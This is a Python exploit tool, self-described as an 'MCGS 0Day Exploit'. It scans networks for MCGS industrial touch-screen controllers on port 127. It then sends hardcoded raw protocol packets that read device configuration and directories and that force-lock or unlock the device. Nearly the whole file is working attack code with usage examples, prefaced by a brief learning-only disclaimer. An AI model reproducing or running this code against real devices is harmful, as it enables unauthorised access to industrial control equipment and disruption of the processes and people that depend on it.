from pwn import *
import argparse
import textwrap
import sys
import nmap


VERSION = "Mo0n V1.0.0 MCGS 0Day Exploit"
TITLE = f'''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it
for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************
'''
LOGO = f'''
 .----------------.  .----------------.  .----------------.  .-----------------.
| .--------------. || .--------------. || .--------------. || .--------------. |
| | ____    ____ | || |     ____     | || |     ____     | || | ____  _____  | |
| ||_   \  /   _|| || |   .'    `.   | || |   .'    '.   | || ||_   \|_   _| | |
| |  |   \/   |  | || |  /  .--.  \  | || |  |  .--.  |  | || |  |   \ | |   | |
| |  | |\  /| |  | || |  | |    | |  | || |  | |    | |  | || |  | |\ \| |   | |
| | _| |_\/_| |_ | || |  \  `--'  /  | || |  |  `--'  |  | || | _| |_\   |_  | |
| ||_____||_____|| || |   `.____.'   | || |   '.____.'   | || ||_____|\____| | |
| |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'
                Github==>https://github.com/MartinxMax
                @Мартин. {VERSION}'''

class MAP_MCGS_MAIN():
    def __init__(self,args):
        self.__scan = args.SCAN
        self.__target = args.RHOST
        self.__get = args.GET
        self.__lock = args.LOCK
        self.__unlock= args.UNLOCK


    def run(self):
        if self.__scan:
            self.__scanner(self.__scan)
        else:
            if self.__target:
                try:
                    pwn_socket = remote(self.__target,'127')
                except Exception as e:
                    log.warning("The host is unreachable, possibly due to network issues or lack of vulnerabilities!")
                else:
                    if self.__get:
                        log.info("Getting device configuration...")
                        pwn_socket.send(self.__get_version())
                        log.info("Device Version:"+self.__decode(pwn_socket.recv(1024).decode(errors='ignore')))
                        pwn_socket.send(self.__get_device())
                        log.info("Device Config:"+self.__decode(pwn_socket.recv(1024).decode(errors='ignore')))
                        pwn_socket.send(self.__get_work_dir())
                        log.info("Device Work Directory:"+self.__decode(pwn_socket.recv(1024).decode(errors='ignore')))
                        pwn_socket.send(self.__get_project_dir())
                        log.info("Device Project Directory:"+self.__decode(pwn_socket.recv(1024).decode(errors='ignore')))
                        log.success("Successfully obtained device configuration...")

                    elif self.__lock:
                        log.info("Locking device...")
                        pwn_socket.send(self.__lock_config_button())
                        pwn_socket.send(self.__feedback_config_page())
                        log.success("Device successfully locked...")
                    elif self.__unlock:
                        log.info("Unlocking device...")
                        pwn_socket.send(self.__unlock_config_button())
                        pwn_socket.send(self.__into_main_page())
                        log.success("Device unlocked successfully...")
                    else:
                        log.warning("Please enter options (-get) (-lock) or (-unlock)!")
                    pwn_socket.close()
            else:
                log.warning("You must fill in the destination address (-rhost <192.168.0.102>)!!!")
                return False


    def __decode(self,data):
        return ''.join([c if c in string.printable else '.' for c in data])


    def __feedback_config_page(self):
        return b'\x24\x00\x00\x00\x00\x00\x00\x48\xa0\xaa\xaa\xaa\x48\xc2\xe4\x0b\x01\x00\x00\x00\x10\x00\x00\x00\x70\x72\x6f\x6a\x65\x63\x74\x41\x73\x79\x6e\x63\x53\x74\x6f\x70\x00\x00\x00\x00'


    def __into_main_page(self):
        return b'\x20\x00\x00\x00\x00\x00\x00\x40\xa0\xaa\xaa\xaa\xf8\xd1\x22\x10\x01\x00\x00\x00\x0c\x00\x00\x00\x70\x72\x6f\x6a\x65\x63\x74\x53\x74\x61\x72\x74\x00\x00\x00\x00'


    def __get_version(self):
        return  b'\x25\x00\x00\x00\x00\x00\x00\x4a\xa0\xaa\xaa\xaa\xe8\xbd\xe4\x0b\x01\x00\x00\x00\x11\x00\x00\x00\x70\x72\x6f\x6a\x65\x63\x74\x47\x65\x74\x56\x65\x72\x73\x69\x6f\x6e\x00\x00\x00\x00'


    def __get_device(self):
        return b'\x24\x00\x00\x00\x00\x00\x00\x48\xa0\xaa\xaa\xaa\x68\xc0\xe4\x0b\x01\x00\x00\x00\x10\x00\x00\x00\x67\x65\x74\x50\x72\x6f\x64\x75\x63\x74\x53\x74\x72\x69\x6e\x67\x00\x00\x00\x00'


    def __get_work_dir(self):
        return b'\x44\x00\x00\x00\x00\x00\x00\x88\xa0\xaa\xaa\xaa\x88\xbe\xe4\x0b\x01\x00\x00\x00\x0a\x00\x00\x00\x67\x65\x74\x45\x6e\x76\x50\x61\x74\x68\x01\x00\x00\x00\x11\x00\x00\x00\x46\x46\x3a\x3a\x75\x74\x69\x6c\x73\x3a\x3a\x53\x74\x72\x69\x6e\x67\x0d\x00\x00\x00\x4d\x43\x47\x53\x5f\x57\x4f\x52\x4b\x5f\x44\x49\x52'


    def __get_project_dir(self):
        return b'\x47\x00\x00\x00\x00\x00\x00\x8e\xa0\xaa\xaa\xaa\x88\xbe\xe4\x0b\x02\x00\x00\x00\x0a\x00\x00\x00\x67\x65\x74\x45\x6e\x76\x50\x61\x74\x68\x01\x00\x00\x00\x11\x00\x00\x00\x46\x46\x3a\x3a\x75\x74\x69\x6c\x73\x3a\x3a\x53\x74\x72\x69\x6e\x67\x10\x00\x00\x00\x4d\x43\x47\x53\x5f\x50\x52\x4f\x4a\x45\x43\x54\x5f\x44\x49\x52'


    def __lock_config_button(self):
        return b'\x4e\x00\x00\x00\x00\x00\x00\x9c\xa0\xaa\xaa\xaa\xb0\x43\xbc\x0d\x01\x00\x00\x00\x14\x00\x00\x00\x70\x72\x6f\x6a\x65\x63\x74\x53\x74\x61\x72\x74\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x01\x00\x00\x00\x11\x00\x00\x00\x46\x46\x3a\x3a\x75\x74\x69\x6c\x73\x3a\x3a\x53\x74\x72\x69\x6e\x67\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x6d\x63\x67\x73\x5f\x61\x70\x70'


    def __unlock_config_button(self):
        return b'\x4f\x00\x00\x00\x00\x00\x00\x9e\xa0\xaa\xaa\xaa\xb0\x43\xbc\x0d\x03\x00\x00\x00\x15\x00\x00\x00\x70\x72\x6f\x6a\x65\x63\x74\x46\x69\x6e\x69\x73\x68\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x01\x00\x00\x00\x11\x00\x00\x00\x46\x46\x3a\x3a\x75\x74\x69\x6c\x73\x3a\x3a\x53\x74\x72\x69\x6e\x67\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x6d\x63\x67\x73\x5f\x61\x70\x70'


    def __scanner(self,ips):
        nm = nmap.PortScanner()
        nm.scan(hosts=ips, arguments='-p127 --open -sS -T4')
        for host in nm.all_hosts():
            if 'tcp' in nm[host]:
                if 127 in nm[host]['tcp']:
                    if 'locus-con' in nm[host]['tcp'][127]['name'].lower():
                        log.success(f"Found MCGS touch screen, there may be a vulnerability [{host}]")
                        return True
        log.failure("No MCGS devices found!")
        return False


if __name__ == '__main__':
    print(LOGO)
    print(TITLE)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
            Example:
                author-Github==>https://github.com/MartinxMax
            Basic usage:
                python3 {Mo0n} -scan <192.168.0.0/24> # Scan MCGS devices
                python3 {Mo0n} -rhost <192.168.0.102> -get # Obtain MCGS configuration
                python3 {Mo0n} -rhost <192.168.0.102> -lock # Forced locking of MCGS
                python3 {Mo0n} -rhost <192.168.0.102> -unlock # Unlock MCGS
                '''.format(Mo0n=sys.argv[0])))
    parser.add_argument('-scan', '--SCAN',default='', help='Scan Device')
    parser.add_argument('-rhost', '--RHOST',default='', help='Target IP')
    parser.add_argument('-get', '--GET', action='store_true', help='Device Config')
    parser.add_argument('-lock', '--LOCK', action='store_true', help='Lock Device')
    parser.add_argument('-unlock', '--UNLOCK', action='store_true', help='UnLock Device')
    args = parser.parse_args()
    MAP_MCGS_MAIN(args).run()
